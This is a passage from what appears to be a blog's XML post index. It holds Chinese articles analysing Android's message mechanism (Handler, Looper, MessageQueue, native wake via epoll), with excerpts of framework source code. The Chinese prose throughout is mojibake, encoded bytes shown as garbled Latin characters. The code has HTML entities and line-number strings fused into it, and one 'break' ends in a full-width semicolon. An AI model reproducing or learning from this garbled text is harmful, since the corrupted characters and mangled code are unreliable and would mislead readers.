ä¸€äº›æ€è€ƒçŽ°åœ¨æ¶ˆæ¯æœºåˆ¶å…¨éƒ¨å†…å®¹åˆ†æžä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°androidçš„æ¶ˆæ¯æœºåˆ¶ä¸ç®—å¤æ‚ï¼Œåˆ†ä¸ºnativeä¸Žjavaä¸¤ä¸ªéƒ¨åˆ†ï¼Œè¿™ä¸¤ä¸ªéƒ¨åˆ†åˆ†åˆ«æœ‰è‡ªå·±çš„æ¶ˆæ¯å¤„ç†æœºåˆ¶ï¼Œå…¶ä¸­å…³é”®çš„è¶…æ—¶ä¸Žå”¤é†’éƒ¨åˆ†æ˜¯å€ŸåŠ©äº†linuxç³»ç»Ÿepollæœºåˆ¶æ¥å®žçŽ°çš„ã€‚ è¿žæŽ¥javaä¸Žnativeå±‚æ¶ˆæ¯å¤„ç†è¿‡ç¨‹çš„æ˜¯next()æ–¹æ³•ä¸­çš„nativePollOnce()ï¼Œjavaå±‚æ¶ˆæ¯å¾ªçŽ¯å…ˆè°ƒç”¨å®ƒï¼Œè‡ªèº«é˜»å¡žï¼Œè¿›å…¥nativeçš„æ¶ˆæ¯å¤„ç†ï¼Œåœ¨nativeæ¶ˆæ¯å¤„ç†å®Œæ¯•åŽè¿”å›žï¼Œå†è¿›è¡Œjavaå±‚çš„æ¶ˆæ¯å¤„ç†ï¼Œæ­£æ˜¯å› ä¸ºå¦‚æ­¤ï¼Œå¦‚æžœæˆ‘ä»¬åœ¨å¤„ç†javaå±‚æ¶ˆæ¯çš„æ—¶å€™æ‰§è¡Œäº†è€—æ—¶æˆ–é˜»å¡žçš„ä»»åŠ¡ï¼ˆç”šè‡³é˜»å¡žäº†æ•´ä¸ªä¸»çº¿ç¨‹ï¼‰ï¼Œæ•´ä¸ªjavaå±‚çš„æ¶ˆæ¯å¾ªçŽ¯å°±ä¼šé˜»å¡žï¼Œä¹Ÿæ— æ³•è¿›å…¥nativeå±‚çš„æ¶ˆæ¯å¤„ç†ï¼Œä¹Ÿå°±æ— æ³•å“åº”ä¾‹å¦‚è§¦æ‘¸äº‹ä»¶è¿™æ ·çš„æ¶ˆæ¯ï¼Œå¯¼è‡´ANRçš„å‘ç”Ÿã€‚è¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸åº”åœ¨ä¸»çº¿ç¨‹ä¸­æ‰§è¡Œè¿™ç±»ä»»åŠ¡çš„åŽŸå› ã€‚]]></content>
      <categories>
        <category>Android</category>
        <category>Event</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Event</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android æ¶ˆæ¯æœºåˆ¶ï¼ˆäºŒï¼‰Handlerå¯¹æ¶ˆæ¯æœºåˆ¶çš„ä½¿ç”¨]]></title>
    <url>%2F2017%2F10%2F24%2Fandroid_event_2%2F</url>
    <content type="text"><![CDATA[Android æ¶ˆæ¯æœºåˆ¶ï¼ˆä¸€ï¼‰æ¶ˆæ¯é˜Ÿåˆ—çš„åˆ›å»ºä¸Žå¾ªçŽ¯çš„å¼€å§‹ Looperä¸ŽMessageQueueä¸­è®²è¿°äº†æ¶ˆæ¯æœºåˆ¶çš„åº•å±‚å®žçŽ°ï¼Œä¸‹é¢å°±ä»Žå¹³æ—¶æ‰€å¸¸ç”¨çš„Handleræ¥è®²è¿°æ¶ˆæ¯æœºåˆ¶çš„ä½¿ç”¨ã€‚ HandlerHandleræ˜¯æˆ‘ä»¬å¹³æ—¶è¿›è¡Œå¼‚æ­¥ã€å¤šçº¿ç¨‹å¼€å‘ä¸­å¸¸ç”¨çš„ä¸€ä¸ªç»„ä»¶ï¼Œå¦‚æžœåœ¨åº”ç”¨ä¸»çº¿ç¨‹ä¸­è°ƒç”¨é˜»å¡žçš„æˆ–è€…èµ„æºæ¶ˆè€—é‡å¤§çš„ä»»åŠ¡ï¼Œä¼šé€ æˆUIçš„æ›´æ–°å¡é¡¿ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šå°†è¿™æ ·çš„ä»»åŠ¡æ”¾åœ¨æ–°çš„çº¿ç¨‹ä¸­è¿›è¡Œæ“ä½œã€‚å½“éœ€è¦é€šçŸ¥UIè¿›è¡Œæ›´æ–°æ—¶ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨Handleråˆ›å»ºæ¶ˆæ¯ä¸¢å…¥ä¸»çº¿ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå†ç­‰å¾…ä¸»çº¿ç¨‹çš„Handlerçš„å¤„ç†æ–¹æ³•éšç€æ¶ˆæ¯çš„å¤„ç†è€Œè¢«è°ƒç”¨ï¼Œå†è¿›è¡Œä¸‹é¢çš„æ“ä½œã€‚è¿™æ˜¯Handlerçš„åŸºæœ¬ç”¨æ³•ï¼Œå®ƒçš„å®žçŽ°å°±ä¸Žæ¶ˆæ¯æœºåˆ¶å¯†åˆ‡ç›¸å…³ã€‚ ä¸‹é¢æˆ‘ä»¬å°±å¯¹å®ƒçš„å®žçŽ°è¿›è¡Œåˆ†æžã€‚ æž„é€ Handlerçš„æž„é€ æ–¹æ³•ä¸­é™¤äº†å®žçŽ°é»˜è®¤å‚æ•°çš„ç›¸äº’è°ƒç”¨å¤–ï¼Œæœ‰å†…å®¹çš„æœ‰è¿™ä¹ˆä¸¤ä¸ªï¼š 1234567891011public Handler(Callback callback, boolean async) &#123; ... mLooper = Looper.myLooper(); if (mLooper == null) &#123; throw new RuntimeException( "Can't create handler inside thread that has not called Looper.prepare()"); &#125; mQueue = mLooper.mQueue; mCallback = callback; mAsynchronous = async;&#125; å¦‚æžœä¼ å…¥çš„äº†callbackï¼Œå°†ä¼šä¿å­˜åˆ°mCallbackåŸŸä¸­ï¼Œä¹‹åŽçš„æ¶ˆæ¯å¤„ç†ä¸­ä¼šçœ‹åˆ°ã€‚ å¦‚æžœæ²¡æœ‰ä¼ å…¥loopå‚æ•°ï¼Œå°†ä¼šä½¿ç”¨é»˜è®¤çš„Looper.myLooper()ä¹Ÿå°±æ˜¯ä¹‹å‰æåˆ°è¿‡çš„æœ¬çº¿ç¨‹TLSä¸­å‚¨å­˜çš„Looperå¯¹è±¡ã€‚mQueueæ¶ˆæ¯é˜Ÿåˆ—å°±æ˜¯ä»Žè¯¥Looperä¸­èŽ·å–çš„æ¶ˆæ¯é˜Ÿåˆ—ã€‚ 123456public Handler(Looper looper, Callback callback, boolean async) &#123; mLooper = looper; mQueue = looper.mQueue; mCallback = callback; mAsynchronous = async;&#125; å¦‚æžœä¼ å…¥äº†looperï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†ä»Žå®ƒè¿™é‡ŒèŽ·å–å¯¹åº”çš„æ¶ˆæ¯é˜Ÿåˆ—å¯¹è±¡ï¼Œä¹‹åŽçš„æ¶ˆæ¯å°±ä¼šæ”¾å…¥è¿™ä¸ªé˜Ÿåˆ—ä¸­ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡Handlerå®žçŽ°è·¨çº¿ç¨‹é€šä¿¡çš„åŸºç¡€ã€‚ å‘é€æ¶ˆæ¯sendMessageè°ƒç”¨é“¾é‚£ä¹ˆæˆ‘ä»¬ç›´æŽ¥è¿›å…¥ä¸»é¢˜ï¼šä½¿ç”¨Handleræ¥å‘é€å¼‚æ­¥å¤„ç†çš„æ¶ˆæ¯ã€‚ å‘é€æ¶ˆæ¯ï¼Œæˆ‘ä»¬æœ€å¸¸ç”¨çš„æ˜¯sendMessage()æ–¹æ³•ï¼š 1234public final boolean sendMessage(Message msg)&#123; return sendMessageDelayed(msg, 0);&#125; 1234567public final boolean sendMessageDelayed(Message msg, long delayMillis)&#123; if (delayMillis &lt; 0) &#123; delayMillis = 0; &#125; return sendMessageAtTime(msg, SystemClock.uptimeMillis() + delayMillis);&#125; 12345678910public boolean sendMessageAtTime(Message msg, long uptimeMillis) &#123; MessageQueue queue = mQueue; if (queue == null) &#123; RuntimeException e = new RuntimeException( this + " sendMessageAtTime() called with no mQueue"); Log.w("Looper", e.getMessage(), e); return false; &#125; return enqueueMessage(queue, msg, uptimeMillis);&#125; æœ€ç»ˆè°ƒç”¨çš„æ˜¯sendMessageAtTime()æ–¹æ³•ï¼Œå‘é€åœ¨ç‰¹å®šæ—¶åˆ»å¤„ç†çš„æ¶ˆæ¯ã€‚ ç„¶åŽè°ƒç”¨enqueueMessage()æ–¹æ³•ï¼š 1234567private boolean enqueueMessage(MessageQueue queue, Message msg, long uptimeMillis) &#123; msg.target = this; if (mAsynchronous) &#123; msg.setAsynchronous(true); &#125; return queue.enqueueMessage(msg, uptimeMillis);&#125; è¿™é‡Œçš„ç¬¬2è¡Œä¸­ï¼Œå°†msgçš„targetè®¾ç½®ä¸ºthisä¹Ÿå°±æ˜¯è¿™ä¸ªHandleræœ¬èº«ï¼Œæˆ‘ä»¬å›žæƒ³èµ·æ¶ˆæ¯å¾ªçŽ¯ä¸­å¤„ç†Messageçš„è°ƒç”¨ï¼š1msg.target.dispatchMessage(msg); çŽ°åœ¨æˆ‘ä»¬çŸ¥é“ï¼ŒHandlerå‘é€çš„æ¶ˆæ¯è¢«æ¶ˆæ¯é˜Ÿåˆ—æ‹¿åˆ°åŽï¼Œä¼šè°ƒç”¨å‘é€å®ƒçš„Handlerçš„dispatchMessage()æ–¹æ³•å¯¹å®ƒè¿›è¡Œå¤„ç†ã€‚ ç„¶åŽï¼Œè°ƒç”¨äº†MessageQueueçš„enqueueMessage()æ–¹æ³•æ¥å‘æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ’å…¥æ¶ˆæ¯ï¼š enqueueMessage12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455boolean enqueueMessage(Message msg, long when) &#123; // ä¸å…è®¸æ²¡æœ‰targetçš„Messageï¼Œè¿™ç§Message(barrier)åªèƒ½ç”±ç³»ç»Ÿäº§ç”Ÿç”¨äºŽå”¤é†’æ¶ˆæ¯é˜Ÿåˆ— if (msg.target == null) &#123; throw new IllegalArgumentException("Message must have a target."); &#125; // é˜²æ­¢æ¶ˆæ¯è¢«é‡å¤å¤„ç† if (msg.isInUse()) &#123; throw new IllegalStateException(msg + " This message is already in use."); &#125; synchronized (this) &#123; // æ£€æŸ¥æ¶ˆæ¯é˜Ÿåˆ—æ˜¯å¦å¤„äºŽé€€å‡ºçŠ¶æ€ if (mQuitting) &#123; IllegalStateException e = new IllegalStateException( msg.target + " sending message to a Handler on a dead thread"); Log.w(TAG, e.getMessage(), e); msg.recycle(); return false; &#125; msg.markInUse(); msg.when = when; Message p = mMessages; boolean needWake; if (p == null || when == 0 || when &lt; p.when) &#123; // åœ¨è¿™ä¸‰ç§æƒ…å†µä¸‹ï¼Œè¿™æ¡æ¶ˆæ¯è¢«æ’å…¥åˆ°äº†é˜Ÿåˆ—çš„å¤´éƒ¨ï¼Œå› æ­¤æˆ‘ä»¬åº”å”¤é†’æ¶ˆæ¯é˜Ÿåˆ— msg.next = p; mMessages = msg; needWake = mBlocked; // å¦‚æžœå¤„äºŽé˜»å¡žçŠ¶æ€ï¼Œåˆ™éœ€è¦è¿›è¡Œå”¤é†’ &#125; else &#123; // åœ¨é˜Ÿåˆ—ä¸­æ’å…¥çš„æ¶ˆæ¯ï¼Œåªæœ‰åœ¨targetä¸ºç©ºï¼ˆbarrierï¼‰å¹¶ä¸”è®¾ç½®ä¸ºå¼‚æ­¥æ—¶ï¼Œéœ€è¦è¿›è¡Œå”¤é†’æ“ä½œ needWake = mBlocked &amp;&amp; p.target == null &amp;&amp; msg.isAsynchronous(); Message prev; // ç†Ÿæ‚‰çš„é“¾è¡¨æ’å…¥æ“ä½œ for (;;) &#123; prev = p; p = p.next; if (p == null || when &lt; p.when) &#123; breakï¼› &#125; if (needWake &amp;&amp; p.isAsynchronous()) &#123; needWake = false; // å¦‚æžœæœ‰æ¶ˆæ¯ä¸éœ€è¦è¿›è¡Œå¼‚æ­¥å¤„ç†ï¼Œåˆ™æ— éœ€è¿›è¡Œå”¤é†’æ“ä½œ &#125; &#125; // æ’å…¥åˆ°pç»“èŠ‚ä¹‹å‰ msg.next = p; prev.next = msg; &#125; // å¦‚æžœæœ‰needWakeæ ‡è®°ï¼Œåˆ™è¿›è¡Œæ¶ˆæ¯é˜Ÿåˆ—çš„å”¤é†’æ“ä½œ if (needWake) &#123; nativeWake(mPtr); &#125; &#125; return true;&#125; æ•´ä¸ªæ–¹æ³•çš„æµç¨‹åœ¨æ³¨é‡Šä¸­è¿›è¡Œäº†åˆ†æžï¼Œè¿™é‡Œä¸»è¦å°±åˆ†ä¸ºäº†ä¸¤ç§æƒ…å†µï¼Œéœ€è¦è¿›è¡Œé˜Ÿåˆ—å”¤é†’ä¸Žæ— éœ€è¿›è¡Œé˜Ÿåˆ—å”¤é†’çš„ï¼Œå¦‚æžœéœ€è¦é˜Ÿåˆ—å”¤é†’æ“ä½œï¼ˆæœ‰needWakeæ ‡è®°ï¼‰ï¼Œåˆ™ä¼šåœ¨è°ƒç”¨çš„æœ€åŽè°ƒç”¨nativeWake()æ–¹æ³•è¿›è¡Œnativeçš„å”¤é†’æ“ä½œã€‚ é˜Ÿåˆ—çš„å”¤é†’1234static void android_os_MessageQueue_nativeWake(JNIEnv* env, jclass clazz, jlong ptr) &#123; NativeMessageQueue* nativeMessageQueue = reinterpret_cast&lt;NativeMessageQueue*&gt;(ptr); nativeMessageQueue-&gt;wake();&#125; nativeæ–¹æ³•ä¸­ï¼Œåˆ©ç”¨mPtræŒ‡é’ˆæ‰¾åˆ°nativeå±‚åˆ›å»ºçš„NativeMessageQueueå¯¹è±¡ï¼Œç„¶åŽè°ƒç”¨äº†å®ƒçš„wake()æ–¹æ³•ï¼š 123void NativeMessageQueue::wake() &#123; mLooper-&gt;wake();&#125; è€ŒæŽ¥ç€è°ƒç”¨çš„æ˜¯NativeMessageQueueå¯¹è±¡çš„ä¸­ä¿å­˜çš„Native Looperå¯¹è±¡çš„wake()æ–¹æ³•ï¼š 12345678910void Looper::wake() &#123; uint64_t inc = 1; ssize_t nWrite = TEMP_FAILURE_RETRY(write(mWakeEventFd, &amp;inc, sizeof(uint64_t))); if (nWrite != sizeof(uint64_t)) &#123; if (errno != EAGAIN) &#123; LOG_ALWAYS_FATAL("Could not write wake signal to fd %d: %s", mWakeEventFd, strerror(errno)); &#125; &#125;&#125; è¿™ä¸ªæ–¹æ³•åšçš„äº‹æƒ…éžå¸¸ç®€å•ï¼Œåˆ©ç”¨write()å‡½æ•°ï¼Œå‘mWakeEventFdè¿™ä¸ªfdä¸­å†™å…¥äº†incè¿™ä¸ªå€¼ï¼ˆ1ï¼‰ã€‚ ä¸ºä»€ä¹ˆåªéœ€è¦è¿™æ ·ç®€å•çš„å†™å…¥å°±å¯ä»¥åšåˆ°å”¤é†’æ¶ˆæ¯é˜Ÿåˆ—å‘¢ï¼Ÿ æˆ‘ä»¬å†å›žæƒ³åˆ°ä¸Šä¸€ç¯‡æ–‡ç« ä¸­çš„Native Looperåˆ›å»ºä¸ŽEpollçš„åˆå§‹åŒ–è¿‡ç¨‹ï¼Œæˆ‘ä»¬åˆ›å»ºäº†è¿™ä¸ªeventFdç±»åž‹çš„mWakeEventFdï¼Œå¹¶ä¸”ä¸ºå®ƒæ³¨å†Œäº†epollç›‘å¬ï¼Œä¸€æ—¦æœ‰æ¥è‡ªäºŽmWakeEventFdçš„æ–°å†…å®¹ï¼ŒNativePollOnce()ä¸­çš„epoll_wait()è°ƒç”¨å°±ä¼šè¿”å›žï¼Œè¿™é‡Œå°±å·²ç»èµ·åˆ°äº†å”¤é†’é˜Ÿåˆ—çš„ä½œç”¨ã€‚ åˆ°è¿™é‡Œï¼Œå‘é€ï¼ˆæ’å…¥ï¼‰æ–°æ¶ˆæ¯åˆ°æ¶ˆæ¯é˜Ÿåˆ—çš„è¿‡ç¨‹å·²ç»å®Œæˆï¼Œæˆ‘ä»¬åªéœ€è¦ç­‰å¾…è®¾ç½®çš„æ—¶é—´åˆ°è¾¾ï¼Œæ¶ˆæ¯é˜Ÿåˆ—å°±ä¼šå–å‡ºæˆ‘ä»¬å‘é€çš„æ¶ˆæ¯å¹¶è¿›è¡Œå¤„ç†ã€‚ æ¶ˆæ¯çš„å¤„ç†æ¶ˆæ¯é˜Ÿåˆ—æ‹¿åˆ°æ¶ˆæ¯åŽï¼Œè°ƒç”¨msg.target.dispatchMessage(msg);è¿›è¡Œæ¶ˆæ¯çš„å¤„ç†ï¼Œä»Žå‰æ–‡æˆ‘ä»¬äº†è§£åˆ°ï¼ŒHandlerå‘é€çš„æ¶ˆæ¯çš„targetå°±æ˜¯Handlerè‡ªèº«ï¼Œæ‰€ä»¥è°ƒç”¨çš„å°±æ˜¯å®ƒçš„dispatchMessage()æ–¹æ³•ï¼š 123456789101112public void dispatchMessage(Message msg) &#123; if (msg.callback != null) &#123; handleCallback(msg); &#125; else &#123; if (mCallback != null) &#123; if (mCallback.handleMessage(msg)) &#123; return; &#125; &#125; handleMessage(msg); &#125;&#125; è¿™ä¸ªè¿‡ç¨‹ä¹Ÿæ¯”è¾ƒç»å…¸ï¼Œç¬¬2è¡Œifåˆ¤æ–­Messageæ˜¯å¦æ‹¥æœ‰è‡ªå·±çš„callbackï¼Œå¦‚æžœæœ‰çš„è¯å°±è°ƒç”¨handleCallback()æ¥è¿è¡Œè¿™ä¸ªRunnableï¼š 123private static void handleCallback(Message message) &#123; message.callback.run();&#125; å¦‚æžœæ²¡æœ‰è‡ªå¸¦callbackï¼Œç¬¬5è¡Œæ£€æŸ¥Handleræ˜¯å¦è‡ªå¸¦callbackï¼Œå¦‚æžœæœ‰çš„è¯å°±åŽ»æ‰§è¡Œè¿™ä¸ªcallbackï¼Œä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ç‚¹ç»†èŠ‚éœ€è¦æ³¨æ„ï¼Œå¦‚æžœè¿™ä¸ªæ–¹æ³•è¿”å›žäº†falseï¼Œé‚£ä¹ˆåŽé¢Handlerè‡ªå¸¦çš„handlerMessage()æ–¹æ³•åŒæ ·ä¼šè¢«æ‰§è¡Œï¼Œè¿™é‡Œå…¶å®žå°±æ˜¯ä¸€ä¸ªæ‰§è¡Œçš„ä¼˜å…ˆçº§é¡ºåºçš„é—®é¢˜ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä½¿ç”¨æ—¶åªä¼šä¼ å…¥callbackæˆ–æ˜¯é‡å†™Handlerçš„handleMessage()æ–¹æ³•ï¼Œä¼˜å…ˆçº§ä¹Ÿå°±æ˜¯ç¡®ä¿ä¸€ä¸ªæ‰§è¡Œé¡ºåºçš„é€»è¾‘ã€‚ åˆ°è¿™é‡Œï¼ŒHandlerçš„éƒ¨åˆ†å°±ç»“æŸäº†ï¼Œä½†æ˜¯æ•´ä¸ªæ¶ˆæ¯æœºåˆ¶çš„åˆ†æžè¿˜æ²¡æœ‰ç»“æŸï¼Œåˆ°çŽ°åœ¨æˆ‘ä»¬åˆ†æžçš„éƒ½æ˜¯javaå±‚å¯¹æ¶ˆæ¯çš„å¤„ç†è¿‡ç¨‹ï¼Œç•¥è¿‡äº†nativeå±‚è‡ªå·±çš„ä¸€å¥—å¤„ç†æ¥è‡ªäºŽnativeçš„æ¶ˆæ¯çš„æœºåˆ¶ï¼Œä¸‹é¢ä¸€ç¯‡æ–‡ç« å°±ä¼šæŠŠå…³æ³¨ç‚¹æ”¾åœ¨è¿™ä¸€éƒ¨åˆ†ã€‚]]></content>
      <categories>
        <category>Android</category>
        <category>Event</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Event</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android æ¶ˆæ¯æœºåˆ¶ï¼ˆä¸€ï¼‰æ¶ˆæ¯é˜Ÿåˆ—çš„åˆ›å»ºä¸Žå¾ªçŽ¯çš„å¼€å§‹ Looperä¸ŽMessageQueue]]></title>
    <url>%2F2017%2F10%2F22%2Fandroid_event_1%2F</url>
    <content type="text"><![CDATA[å†™åœ¨å‰é¢ æœ¬æ–‡åŸºäºŽAndroid 7.1.1 (API 25)çš„æºç åˆ†æžç¼–å†™ ä¸Žä¹‹å‰çš„è§¦æ‘¸äº‹ä»¶åˆ†å‘æœºåˆ¶åˆ†æžçš„æ–‡ç« ä¸€æ ·ï¼ŒAndroidç³»ç»Ÿæœºåˆ¶çš„åˆ†æžä¸­å…³é”®çš„ä¸€çŽ¯å°±æ˜¯äº‹ä»¶æ¶ˆæ¯çš„å¤„ç†ã€‚ä¹‹å‰ä¹Ÿè¯´è¿‡ï¼ŒAndroidæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨çš„æ¨¡åž‹ï¼Œé€šè¿‡å„å¼å„æ ·ä¸æ–­äº§ç”Ÿäº‹ä»¶æ¶ˆæ¯çš„æ¥æŽ¨åŠ¨UIã€æ•°æ®çš„æ›´æ–°ä¸Žå¯¹æˆ‘ä»¬äº¤äº’çš„åé¦ˆï¼Œæ²¡æœ‰äº‹ä»¶æ¶ˆæ¯çš„äº§ç”Ÿï¼Œå°±ä¸ä¼šæœ‰ç›´è§‚çš„ç•Œé¢çš„å˜åŒ–ï¼Œä¹Ÿå°±ä¸ä¼šæœ‰åº”ç”¨ä¸°å¯Œçš„åŠŸèƒ½ã€‚ æ‰€ä»¥Androidçš„æ¶ˆæ¯æœºåˆ¶ä¸Žå…¶ä»–è¿‡ç¨‹çš„å…³ç³»æ˜¯æžå…¶ç´§å¯†çš„ï¼Œä¾‹å¦‚å¯åŠ¨Activityçš„è¿‡ç¨‹å°±æ¶‰åŠåˆ°ActivityManagerServiceä¸Žåº”ç”¨ä¸»è¿›ç¨‹çš„é€šä¿¡ï¼Œäº§ç”Ÿçš„é€šçŸ¥æ¶ˆæ¯é€šè¿‡Binderæœºåˆ¶é€å…¥åº”ç”¨ä¸»è¿›ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå†ç”±ä¸»è¿›ç¨‹çš„æ¶ˆæ¯å¾ªçŽ¯æ¥è¯»å–è¿™ä¸€æ¶ˆæ¯æ¥è¿›è¡Œå¤„ç†ã€‚ä¹‹å‰è§¦æ‘¸äº‹ä»¶åˆ†å‘ä¸­ä¹Ÿæ˜¯åˆ©ç”¨äº†åº”ç”¨ä¸»è¿›ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—æ¥è¯»å–æˆ‘ä»¬çš„è§¦æ‘¸äº‹ä»¶å†è¿›è¡ŒåŽç»­çš„åˆ†å‘å¤„ç†ã€‚å¯ä»¥è¯´æ¶ˆæ¯é˜Ÿåˆ—åœ¨å„ç§é€šä¿¡è¿‡ç¨‹ä¸­æ— å¤„ä¸åœ¨ã€‚ æ¶ˆæ¯é˜Ÿåˆ—çš„å­˜åœ¨ä¸ºå¼‚æ­¥å¤„ç†æä¾›äº†ä¸€ä¸ªéžå¸¸å¥½çš„åŸºç¡€ï¼Œæœ‰äº†æ¶ˆæ¯é˜Ÿåˆ—ä¹‹åŽï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨æ–°çš„çº¿ç¨‹ä¸­å¤„ç†è®¡ç®—ã€IOå¯†é›†ã€é˜»å¡žçš„ä»»åŠ¡è€Œä¸ä¼šå½±å“UIçš„æ›´æ–°ï¼Œåœ¨å¤„ç†è¿‡ç¨‹ä¸­å¯ä»¥é€šè¿‡å‘æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ”¾å…¥æ¶ˆæ¯æ¥è¿›è¡ŒUIçš„æ›´æ–°æ“ä½œï¼Œè€Œå‘é€æ¶ˆæ¯çš„è¡Œä¸ºä¹Ÿé¿å…äº†å·¥ä½œçº¿ç¨‹ä¸ºäº†ç­‰å¾…è¿”å›žè€Œé€ æˆçš„é˜»å¡žã€‚ å¯ä»¥è¯´ï¼Œæƒ³è¦äº†è§£å…¶ä»–åŸºäºŽäº‹ä»¶çš„è¿‡ç¨‹ï¼Œå¯¹ä¸»çº¿ç¨‹æ¶ˆæ¯æœºåˆ¶çš„äº†è§£æ˜¯å¿…ä¸å¯å°‘çš„åŸºç¡€ï¼Œåœ¨è§¦æ‘¸äº‹ä»¶åˆ†å‘æœºåˆ¶åˆ†æžçš„æ–‡ç« ä¸­æˆ‘å¯¹æ¶ˆæ¯æœºåˆ¶è¿˜ä¸æ˜¯å¾ˆäº†è§£ï¼Œæ‰€ä»¥åŽæ¥å‘çŽ°åˆ†æžä¸­æœ‰å¾ˆå¤šæè¿°ä¸å¦¥çš„åœ°æ–¹ï¼Œæ‰€ä»¥åœ¨å¯¹æ¶ˆæ¯æœºåˆ¶çš„ç³»ç»Ÿå­¦ä¹ ä¹‹åŽæˆ‘åˆä¿®æ”¹å®Œå–„äº†è¿™éƒ¨åˆ†çš„å†…å®¹ã€‚ å¼•å…¥Android Studioçš„3.0ç‰ˆæœ¬ä¸­å¼•å…¥äº†ä¸€ä¸ªå¼ºå¤§çš„æ€§èƒ½åˆ†æžå·¥å…·ï¼šAndroid Profilerï¼Œå¯¹äºŽå®ƒçš„è¯¦ç»†ä»‹ç»å¯ä»¥çœ‹å®˜æ–¹çš„æ–‡æ¡£ã€‚ æˆ‘ä»¬å¯¹ä¸€ä¸ªç®€å•çš„HelloWorldåº”ç”¨è¿›è¡Œæ–¹æ³•åˆ†æžï¼š å¯ä»¥çœ‹åˆ°ï¼Œå¯¹äºŽè¿™æ ·ä¸€ä¸ªæ²¡æœ‰ä»»åŠ¡éœ€è¦å¤„ç†çš„ç¨‹åºï¼Œè¿™æ®µæ—¶é—´ä¸­å®ƒä¸€ç›´æ‰§è¡Œçš„æ˜¯nativePollOnce()æ–¹æ³•ï¼Œå¯¹äºŽè¿™ä¸ªï¼Œstackoverflowä¸Šå°±æœ‰äººæäº†ä¸€ä¸ªé—®é¢˜ã€‚è¿™ä¸ªæ–¹æ³•å…¶å®žå°±æ˜¯æ¶ˆæ¯é˜Ÿåˆ—åœ¨é˜Ÿåˆ—ä¸­æ²¡æœ‰æ¶ˆæ¯æ—¶å¤„äºŽç­‰å¾…çŠ¶æ€æ‰§è¡Œçš„ä¸€ä¸ªNativeæ–¹æ³•ã€‚ æˆ‘ä»¬çš„åˆ†æžå°±ä»Žæ¶ˆæ¯é˜Ÿåˆ—(MessageQueue)ä¸Žè´Ÿè´£æ‰§è¡Œå¾ªçŽ¯è¿‡ç¨‹çš„Looperå¯¹è±¡çš„åˆ›å»ºä¸Žå¼€å§‹è¿è¡Œå¼€å§‹ã€‚ Looperä¸ŽMessageQueueçš„åˆ›å»ºå½“ä¸€ä¸ªActivityè¢«åˆ›å»ºæ—¶ï¼ŒActivityThreadçš„main()æ–¹æ³•ä¼šè¢«æ‰§è¡Œï¼ˆå…³äºŽActivityåˆ›å»ºè¿‡ç¨‹çš„å†…å®¹ï¼Œè¯·å‚é˜…å¯åŠ¨åˆ†æžç›¸å…³çš„æ–‡ç« ï¼‰ï¼š 1234567891011public static void main(String[] args) &#123; Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, "ActivityThreadMain");... Looper.prepareMainLooper();... Looper.loop(); throw new RuntimeException("Main thread loop unexpectedly exited");&#125; Looperçš„åˆ›å»ºç¬¬5è¡Œä¸­ï¼Œè°ƒç”¨Looperçš„prepareMainLooper()æ–¹æ³•æ¥åˆ›å»ºLooperå¯¹è±¡ï¼š 123456789public static void prepareMainLooper() &#123; prepare(false); synchronized (Looper.class) &#123; if (sMainLooper != null) &#123; throw new IllegalStateException("The main Looper has already been prepared."); &#125; sMainLooper = myLooper(); &#125;&#125; 123456private static void prepare(boolean quitAllowed) &#123; if (sThreadLocal.get() != null) &#123; throw new RuntimeException("Only one Looper may be created per thread"); &#125; sThreadLocal.set(new Looper(quitAllowed));&#125; è¿™é‡Œçš„sThreadLocalå¯¹è±¡çš„ç±»åž‹æ˜¯ThreadLocal&lt;Looper&gt;æ˜¯ä¸€ä¸ªå­˜æ”¾åœ¨TLSï¼ˆThread-local storage)ä¸­çš„å¯¹è±¡å®¹å™¨ï¼Œå‚¨å­˜åœ¨å…¶ä¸­çš„å¯¹è±¡çš„ç‰¹ç‚¹æ˜¯æ¯ä¸ªçº¿ç¨‹ä¸­åªæœ‰ä¸€ä¸ªï¼Œå¹¶ä¸”ä¸ªçº¿ç¨‹ä¸­å‚¨å­˜çš„è¯¥å¯¹è±¡ä¸ç›¸åŒã€‚ æˆ‘ä»¬åœ¨è¿™é‡Œæ–°å»ºäº†ä¸€ä¸ªLooperå¯¹è±¡å¹¶æ”¾å…¥äº†TLSä¸­ï¼š 1234private Looper(boolean quitAllowed) &#123; mQueue = new MessageQueue(quitAllowed); mThread = Thread.currentThread();&#125; mThreadä¿å­˜äº†å½“å‰è¿è¡ŒLooperçš„è¿›ç¨‹ä¿¡æ¯ã€‚ è€ŒmQueueå°±æ˜¯ä¸ŽLooperå¯¹åº”çš„MessageQueueã€‚ MessageQueueçš„åˆ›å»º1234MessageQueue(boolean quitAllowed) &#123; mQuitAllowed = quitAllowed; mPtr = nativeInit();&#125; æž„é€ å‡½æ•°ååˆ†ç®€å•ï¼Œé™¤äº†åˆå§‹åŒ–quitAllowedæ ‡è®°ä¹‹å¤–ï¼Œå°±æ˜¯å¯¹mPtrçš„åˆå§‹åŒ–äº†ã€‚ 